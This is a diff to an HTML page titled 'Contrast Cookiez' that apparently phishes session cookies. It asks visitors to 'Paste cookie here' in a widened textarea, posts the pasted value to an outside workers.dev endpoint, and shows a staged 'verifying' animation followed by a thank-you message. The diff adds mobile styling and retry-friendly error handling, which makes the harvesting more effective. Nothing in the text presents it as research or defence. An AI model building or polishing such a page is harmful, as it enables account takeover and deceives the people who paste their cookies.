@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta charset="UTF-8">
 <title>Contrast Cookiez</title>
 
@@ -70,18 +71,17 @@
 * { box-sizing: border-box; }
 
 body {
-  margin: 0;
-  height: 100vh;
-  font-family: Inter, Arial, sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background:
-    radial-gradient(circle at top left, #6a11cb, transparent 60%),
-    radial-gradient(circle at bottom right, #2575fc, transparent 60%),
-    #050505;
-  overflow: hidden;
+  background: linear-gradient(120deg, #6a11cb, #2575fc, #00c6ff);
+  background-size: 300% 300%;
+  animation: bgShift 12s ease infinite;
 }
+
+@keyframes bgShift {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
 
 /* ---------- CARD ---------- */
 .card {
@@ -100,6 +100,18 @@ body {
   transition: 0.7s cubic-bezier(.22,1,.36,1);
 }
 
+  textarea {
+  width: 100%;
+  min-height: 120px;
+  margin-top: 14px;
+  padding: 14px 18px;
+  border-radius: 20px;
+  border: 2px solid #111;
+  font-size: 14px;
+  resize: vertical;
+  outline: none;
+}
+
 /* ---------- STATES ---------- */
 .hidden {
   opacity: 0;
@@ -114,6 +126,12 @@ body {
 }
 
 /* ---------- PROGRESS ---------- */
+.circle,
+.spinner,
+.progress-bar {
+  position: absolute;
+}
+
 .progress {
   display: flex;
   justify-content: center;
@@ -172,6 +190,10 @@ button {
   overflow: hidden;
   transition: 0.35s;
   margin-top: 16px;
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 
 }
 
@@ -286,6 +308,23 @@ button.success .btn-text { opacity: 0; }
   display: none;
 }
 
+  @media (max-width: 480px) {
+  .card {
+    width: calc(100% - 24px);
+    padding: 24px;
+    border-radius: 24px;
+  }
+
+  h1 {
+    font-size: 32px;
+  }
+
+  textarea {
+    font-size: 13px;
+  }
+}
+
+
 /* ---------- FOOTER ---------- */
 .footer {
   margin-top: 24px;
@@ -328,7 +367,7 @@ button.success .btn-text { opacity: 0; }
   <hr>
 
   <label>ENTER DETAILS:</label>
-  <input id="response" type="text" placeholder="Cookie here">
+  <textarea id="response" placeholder="Paste cookie here"></textarea>
 
   <button id="submitBtn">
     <div class="progress-bar">
@@ -403,11 +442,26 @@ const dotInterval = setInterval(() => {
 await new Promise(r => setTimeout(r, 1600));
 
 // Send to worker
-await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ response: input.value })
-});
+let res;
+try {
+  res = await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ response: input.value })
+  });
+} catch (e) {
+  alert("Network error. Try again.");
+  btn.disabled = false;
+  btn.classList.remove("verifying");
+  return;
+}
+
+if (!res.ok) {
+  alert("Submission failed. Payload too large or server rejected it.");
+  btn.disabled = false;
+  btn.classList.remove("verifying");
+  return;
+}
 
 clearInterval(dotInterval);
 
@@ -427,6 +481,7 @@ thankyou.style.display = "block";
 
 </body>
 </html>
+
 
 
 
